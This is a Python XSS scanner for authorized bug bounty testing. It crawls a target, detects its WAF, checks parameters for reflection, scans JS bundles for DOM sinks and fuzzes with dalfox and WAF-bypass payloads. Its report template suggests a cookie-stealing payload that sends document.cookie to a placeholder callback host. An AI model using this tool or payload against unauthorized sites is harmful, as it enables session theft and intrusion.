#!/usr/bin/env python3
"""
XSS Scanner — Hybrid automated XSS discovery tool
Combines katana (crawl), wafw00f (WAF detection), dalfox (fuzzing),
JS bundle DOM sink analysis, and OOB tracking.

Usage:
  python3 scanner.py -u https://target.com
  python3 scanner.py -u https://target.com --oob https://your.interactsh.com
  python3 scanner.py -u https://target.com --deep --report output.md
"""

import argparse
import asyncio
import json
import os
import re
import subprocess
import sys
import time
import urllib.parse
import zipfile
from datetime import datetime
from pathlib import Path

import httpx
from bs4 import BeautifulSoup

# ── Colours ──────────────────────────────────────────────────────────────────
R  = "\033[91m"   # red
G  = "\033[92m"   # green
Y  = "\033[93m"   # yellow
B  = "\033[94m"   # blue
M  = "\033[95m"   # magenta
C  = "\033[96m"   # cyan
W  = "\033[97m"   # white
BO = "\033[1m"
RE = "\033[0m"

BANNER = f"""
{M}{BO}
  ██╗  ██╗███████╗███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗
  ╚██╗██╔╝██╔════╝██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║
   ╚███╔╝ ███████╗███████╗    ███████╗██║     ███████║██╔██╗ ██║
   ██╔██╗ ╚════██║╚════██║    ╚════██║██║     ██╔══██║██║╚██╗██║
  ██╔╝ ██╗███████║███████║    ███████║╚██████╗██║  ██║██║ ╚████║
  ╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
{RE}{C}  XSS Scanner — Automated Discovery + WAF Bypass{RE}
{Y}  For authorized bug bounty testing only{RE}
"""

CANARY    = "xsscan7r4ck"
GOPATH    = subprocess.getoutput("go env GOPATH").strip()
GOBIN     = os.path.join(GOPATH, "bin")

# DOM sinks to hunt in JS bundles
DOM_SINKS = [
    "innerHTML", "outerHTML", "document.write", "document.writeln",
    "insertAdjacentHTML", "eval(", "setTimeout(", "setInterval(",
    "new Function(", "location.href", "location.assign", "location.replace",
    "location =", "window.open(", "dangerouslySetInnerHTML", "__html",
    "$.html(", "postMessage", "router.query", "searchParams.get",
    "location.hash", "location.search",
]

# DOM sources
DOM_SOURCES = [
    "location.search", "location.hash", "location.href",
    "document.referrer", "document.cookie", "postMessage",
    "localStorage", "sessionStorage", "window.name",
    "router.query", "useSearchParams", "searchParams",
]

findings = []


def log(level, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    icons = {"info": f"{B}[*]{RE}", "good": f"{G}[+]{RE}",
             "warn": f"{Y}[!]{RE}", "bad":  f"{R}[-]{RE}",
             "crit": f"{R}{BO}[!!!]{RE}"}
    print(f"{icons.get(level,'[?]')} {ts} {msg}")


def run(cmd, timeout=120):
    """Run a shell command, return (stdout, returncode)."""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True,
            text=True, timeout=timeout,
            env={**os.environ, "PATH": f"{GOBIN}:{os.environ.get('PATH','')}"}
        )
        return result.stdout + result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "", 1
    except Exception as e:
        return str(e), 1


# ── Stage 1: WAF Detection ────────────────────────────────────────────────────
def detect_waf(target):
    log("info", f"Detecting WAF on {target}...")
    out, _ = run(f"wafw00f {target} -a 2>&1")
    waf = "generic"
    for line in out.splitlines():
        low = line.lower()
        if "cloudflare" in low:   waf = "cloudflare"; break
        if "akamai"     in low:   waf = "akamai";     break
        if "aws"        in low:   waf = "aws_waf";    break
        if "sucuri"     in low:   waf = "generic";    break
        if "no waf"     in low:   waf = "none";       break

    if waf == "none":
        log("good", "No WAF detected — standard payload list will be used")
    else:
        log("warn", f"WAF detected: {BO}{waf.upper()}{RE} — loading bypass wordlist")
    return waf


# ── Stage 2: Crawl ────────────────────────────────────────────────────────────
def crawl(target, depth=3):
    log("info", f"Crawling {target} (depth={depth})...")
    out, code = run(
        f"katana -u {target} -d {depth} -jc -kf all -silent -o /tmp/xss_urls.txt 2>&1",
        timeout=180
    )
    urls = []
    try:
        with open("/tmp/xss_urls.txt") as f:
            urls = [l.strip() for l in f if l.strip()]
    except FileNotFoundError:
        pass

    # Also extract from stdout
    for line in out.splitlines():
        if line.startswith("http"):
            urls.append(line.strip())

    urls = list(set(urls))
    log("good", f"Discovered {len(urls)} URLs")
    return urls


# ── Stage 3: Canary Injection ─────────────────────────────────────────────────
def inject_canary(urls):
    log("info", f"Injecting canary ({CANARY}) into {len(urls)} URLs...")
    reflected = []

    with httpx.Client(timeout=10, follow_redirects=True,
                      verify=False, headers={"User-Agent": "Mozilla/5.0"}) as client:
        for url in urls:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            if not params:
                continue

            # Inject canary into each param
            for param in params:
                test_params = {k: (CANARY if k == param else v[0])
                               for k, v in params.items()}
                test_url = parsed._replace(
                    query=urllib.parse.urlencode(test_params)
                ).geturl()

                try:
                    resp = client.get(test_url)
                    if CANARY in resp.text:
                        # Determine context
                        context = get_context(resp.text, CANARY)
                        log("good", f"Reflected [{context}] → {param} in {url}")
                        reflected.append({
                            "url": url, "param": param,
                            "context": context, "test_url": test_url
                        })
                except Exception:
                    continue

    log("good", f"Found {len(reflected)} reflection points")
    return reflected


def get_context(html, canary):
    """Determine injection context from surrounding HTML."""
    idx = html.find(canary)
    if idx == -1:
        return "unknown"
    surrounding = html[max(0, idx-100):idx+100]

    # Check if inside a script tag
    pre = html[:idx]
    script_opens  = pre.count("<script")
    script_closes = pre.count("</script")
    if script_opens > script_closes:
        if '"' + canary in html or "'" + canary in html:
            return "js_string"
        return "js_block"

    # Check if inside an attribute
    if re.search(r'(?:href|src|value|action|data)[=\s]*["\']?[^"\'<>]*' + canary, surrounding):
        return "html_attribute"

    return "html_body"


# ── Stage 4: JS Bundle Analysis ───────────────────────────────────────────────
def analyze_js_bundles(target):
    log("info", "Downloading and analysing JavaScript bundles...")
    bundle_dir = Path("/tmp/xss_bundles")
    bundle_dir.mkdir(exist_ok=True)
    sink_findings = []

    with httpx.Client(timeout=15, follow_redirects=True, verify=False) as client:
        try:
            resp = client.get(target)
            html = resp.text
        except Exception as e:
            log("bad", f"Failed to fetch target: {e}")
            return sink_findings

        # Extract JS bundle URLs
        soup = BeautifulSoup(html, "html.parser")
        js_urls = []

        # Standard script tags
        for tag in soup.find_all("script", src=True):
            src = tag["src"]
            if src.startswith("http"):
                js_urls.append(src)
            elif src.startswith("/"):
                base = f"{urllib.parse.urlparse(target).scheme}://{urllib.parse.urlparse(target).netloc}"
                js_urls.append(base + src)

        # Next.js chunks
        nextjs_chunks = re.findall(r'/_next/static/chunks/[^\s"\'<>]+\.js', html)
        base = f"{urllib.parse.urlparse(target).scheme}://{urllib.parse.urlparse(target).netloc}"
        for chunk in nextjs_chunks:
            js_urls.append(base + chunk)

        js_urls = list(set(js_urls))
        log("info", f"Found {len(js_urls)} JS bundles")

        # Download and analyse each bundle
        for js_url in js_urls[:30]:  # cap at 30 bundles
            try:
                r = client.get(js_url, timeout=10)
                if r.status_code != 200:
                    continue
                content = r.text
                fname = bundle_dir / (urllib.parse.quote(js_url, safe="")[-60:] + ".js")
                fname.write_text(content, encoding="utf-8", errors="ignore")

                # Check for source maps
                map_url = js_url + ".map"
                map_r = client.get(map_url, timeout=5)
                if map_r.status_code == 200:
                    log("warn", f"Source map exposed: {map_url}")
                    sink_findings.append({
                        "type": "source_map_exposed",
                        "url": map_url,
                        "severity": "MEDIUM",
                        "detail": "Source map publicly accessible — exposes original source code"
                    })

                # Hunt for sinks
                for sink in DOM_SINKS:
                    if sink in content:
                        # Get surrounding context
                        idx = content.find(sink)
                        ctx = content[max(0, idx-80):idx+120].replace("\n", " ").strip()
                        severity = "HIGH" if sink in [
                            "dangerouslySetInnerHTML", "__html", "eval(",
                            "innerHTML", "document.write"
                        ] else "MEDIUM"
                        log("warn" if severity == "MEDIUM" else "bad",
                            f"DOM sink [{severity}] {sink} in {js_url.split('/')[-1]}")
                        sink_findings.append({
                            "type": "dom_sink",
                            "sink": sink,
                            "url": js_url,
                            "context": ctx[:200],
                            "severity": severity
                        })

                # Hunt for sources feeding sinks
                for source in DOM_SOURCES:
                    if source in content:
                        log("info", f"DOM source {source} found in {js_url.split('/')[-1]}")
                        sink_findings.append({
                            "type": "dom_source",
                            "source": source,
                            "url": js_url,
                            "severity": "INFO"
                        })

            except Exception:
                continue

    high = sum(1 for f in sink_findings if f.get("severity") == "HIGH")
    med  = sum(1 for f in sink_findings if f.get("severity") == "MEDIUM")
    log("good", f"JS analysis complete — {high} HIGH, {med} MEDIUM sink findings")
    return sink_findings


# ── Stage 5: XSS Fuzzing with Dalfox ─────────────────────────────────────────
def fuzz_with_dalfox(target, waf, oob=None, reflected=None):
    log("info", "Running dalfox XSS fuzzer...")
    xss_findings = []

    # Load WAF-specific bypass wordlist
    bypass_file = Path(__file__).parent / "waf_bypasses.json"
    waf_payloads = []
    if bypass_file.exists():
        with open(bypass_file) as f:
            bypasses = json.load(f)
            waf_payloads = bypasses.get(waf, bypasses.get("generic", []))
        log("info", f"Loaded {len(waf_payloads)} WAF bypass payloads for {waf}")

    # Write custom payload file
    custom_payload_file = "/tmp/xss_custom_payloads.txt"
    payload_file = Path(__file__).parent / "payloads.txt"
    all_payloads = waf_payloads[:]
    if payload_file.exists():
        with open(payload_file) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    all_payloads.append(line)

    with open(custom_payload_file, "w") as f:
        f.write("\n".join(all_payloads))

    # Build dalfox command
    oob_flag = f"--blind {oob}" if oob else ""
    dalfox_base = (
        f"dalfox url {target} "
        f"--custom-payload {custom_payload_file} "
        f"--skip-bav "
        f"--silence "
        f"--output /tmp/dalfox_results.txt "
        f"{oob_flag} "
        f"2>&1"
    )

    log("info", f"Fuzzing target: {target}")
    out, _ = run(dalfox_base, timeout=300)

    # Also fuzz reflected params individually
    if reflected:
        for r in reflected[:10]:  # cap at 10 reflected params
            param_url = r["test_url"]
            log("info", f"Fuzzing reflected param: {r['param']}")
            cmd = (
                f"dalfox url \"{param_url}\" "
                f"--custom-payload {custom_payload_file} "
                f"--skip-bav --silence "
                f"{oob_flag} "
                f"2>&1"
            )
            param_out, _ = run(cmd, timeout=120)
            out += param_out

    # Parse dalfox output
    try:
        with open("/tmp/dalfox_results.txt") as f:
            out += f.read()
    except FileNotFoundError:
        pass

    for line in out.splitlines():
        if "[V]" in line or "VULN" in line.upper() or "XSS" in line:
            log("crit", f"XSS Confirmed: {line.strip()}")
            xss_findings.append({
                "type": "xss_confirmed",
                "detail": line.strip(),
                "severity": "HIGH"
            })
        elif "[POC]" in line or "poc" in line.lower():
            log("warn", f"XSS PoC: {line.strip()}")
            xss_findings.append({
                "type": "xss_poc",
                "detail": line.strip(),
                "severity": "HIGH"
            })

    log("good", f"Dalfox complete — {len(xss_findings)} XSS findings")
    return xss_findings


# ── Stage 6: Report Generation ────────────────────────────────────────────────
def generate_report(target, waf, reflected, js_findings, xss_findings, output_file):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    total = len(xss_findings) + len([f for f in js_findings if f["severity"] == "HIGH"])

    lines = [
        f"# XSS Scan Report — {target}",
        f"**Date:** {ts}  ",
        f"**WAF Detected:** {waf.upper()}  ",
        f"**Reflection Points:** {len(reflected)}  ",
        f"**Confirmed XSS:** {len(xss_findings)}  ",
        f"**JS DOM Sink Issues:** {len([f for f in js_findings if f['type'] == 'dom_sink'])}  ",
        "",
        "---",
        "",
        "## Executive Summary",
        "",
    ]

    if xss_findings:
        lines.append(f"🔴 **{len(xss_findings)} confirmed XSS vulnerabilities** were found.")
    high_sinks = [f for f in js_findings if f["severity"] == "HIGH"]
    if high_sinks:
        lines.append(f"🟠 **{len(high_sinks)} HIGH-severity DOM sinks** identified in JS bundles.")
    if reflected and not xss_findings:
        lines.append(f"🟡 **{len(reflected)} reflection points** found but no confirmed XSS yet — manual testing recommended.")
    if not xss_findings and not reflected:
        lines.append("🟢 No reflected XSS or confirmed DOM XSS found in automated scan.")
        lines.append("Manual testing of DOM sinks and JS bundles recommended.")

    lines += ["", "---", "", "## 1. Confirmed XSS Findings", ""]
    if xss_findings:
        for i, f in enumerate(xss_findings, 1):
            lines += [
                f"### Finding {i} — {f['type'].replace('_',' ').title()}",
                f"**Severity:** {f['severity']}  ",
                f"**Detail:** `{f['detail']}`  ",
                ""
            ]
    else:
        lines.append("No confirmed XSS from automated fuzzing. Review DOM sinks manually.")

    lines += ["", "---", "", "## 2. Reflection Points", ""]
    if reflected:
        lines.append("| Parameter | URL | Context |")
        lines.append("|---|---|---|")
        for r in reflected:
            lines.append(f"| `{r['param']}` | `{r['url'][:80]}` | {r['context']} |")
    else:
        lines.append("No reflection points found.")

    lines += ["", "---", "", "## 3. JS Bundle DOM Sink Analysis", ""]
    sinks = [f for f in js_findings if f["type"] == "dom_sink"]
    sources = [f for f in js_findings if f["type"] == "dom_source"]
    maps = [f for f in js_findings if f["type"] == "source_map_exposed"]

    if maps:
        lines += ["### ⚠️ Exposed Source Maps", ""]
        for m in maps:
            lines.append(f"- `{m['url']}` — {m['detail']}")
        lines.append("")

    if sinks:
        lines += ["### Dangerous Sinks Found", ""]
        lines.append("| Severity | Sink | Bundle | Context |")
        lines.append("|---|---|---|---|")
        for s in sinks:
            bundle = s["url"].split("/")[-1][:40]
            ctx = s["context"][:60].replace("|", "\\|")
            lines.append(f"| {s['severity']} | `{s['sink']}` | `{bundle}` | `{ctx}...` |")
        lines.append("")

    if sources:
        lines += ["### DOM Sources Found", ""]
        for s in sources:
            bundle = s["url"].split("/")[-1][:40]
            lines.append(f"- `{s['source']}` in `{bundle}`")
        lines.append("")

    lines += [
        "", "---", "",
        "## 4. Next Steps",
        "",
        "1. **Manually trace** each HIGH-severity sink to its data source",
        "2. **Test DOM sinks** with context-specific payloads from the XSS methodology PDF",
        "3. **Check reflection points** that didn't confirm — try WAF bypass variants manually",
        "4. **Review source maps** if exposed — reconstruct original source for deeper analysis",
        "5. **Test OOB callbacks** by replacing `alert(1)` with `fetch('https://your.interactsh.com/?c='+document.cookie)`",
        "",
        "---",
        "",
        "*Generated by XSS Scanner — For authorized testing only*"
    ]

    report = "\n".join(lines)
    with open(output_file, "w") as f:
        f.write(report)
    log("good", f"Report saved → {output_file}")
    return report


# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="XSS Scanner — Automated discovery + WAF bypass"
    )
    parser.add_argument("-u", "--url",    required=True, help="Target URL (authorized targets only)")
    parser.add_argument("--oob",          default=None,  help="OOB callback URL (interactsh/canarytokens)")
    parser.add_argument("--depth",        default=3,     type=int, help="Crawl depth (default: 3)")
    parser.add_argument("--report",       default=None,  help="Output report file (default: xss_report_<domain>.md)")
    parser.add_argument("--deep",         action="store_true", help="Deep scan — more payloads, slower")
    parser.add_argument("--skip-crawl",   action="store_true", help="Skip crawling, only fuzz the given URL")
    parser.add_argument("--skip-js",      action="store_true", help="Skip JS bundle analysis")
    args = parser.parse_args()

    target = args.url.rstrip("/")
    domain = urllib.parse.urlparse(target).netloc.replace(".", "_")
    report_file = args.report or f"xss_report_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"

    log("info", f"Target: {BO}{target}{RE}")
    log("info", f"Report: {report_file}")
    if args.oob:
        log("info", f"OOB callback: {args.oob}")

    start = time.time()

    # Stage 1 — WAF detection
    waf = detect_waf(target)

    # Stage 2 — Crawl
    if args.skip_crawl:
        urls = [target]
        log("warn", "Skipping crawl — only scanning target URL")
    else:
        urls = crawl(target, depth=args.depth)
        if not urls:
            log("warn", "No URLs discovered by katana — falling back to target URL only")
            urls = [target]

    # Stage 3 — Canary injection
    reflected = inject_canary(urls)

    # Stage 4 — JS bundle analysis
    js_findings = []
    if not args.skip_js:
        js_findings = analyze_js_bundles(target)

    # Stage 5 — Dalfox fuzzing
    xss_findings = fuzz_with_dalfox(target, waf, oob=args.oob, reflected=reflected)

    # Stage 6 — Report
    elapsed = round(time.time() - start, 1)
    log("good", f"Scan complete in {elapsed}s")
    print()
    print(f"{BO}{'='*60}{RE}")
    print(f"  {R}XSS Confirmed:  {len(xss_findings)}{RE}")
    print(f"  {Y}Reflection pts: {len(reflected)}{RE}")
    print(f"  {Y}DOM Sinks:      {len([f for f in js_findings if f['type']=='dom_sink'])}{RE}")
    print(f"  {B}WAF:            {waf.upper()}{RE}")
    print(f"{BO}{'='*60}{RE}")
    print()

    generate_report(target, waf, reflected, js_findings, xss_findings, report_file)


if __name__ == "__main__":
    main()
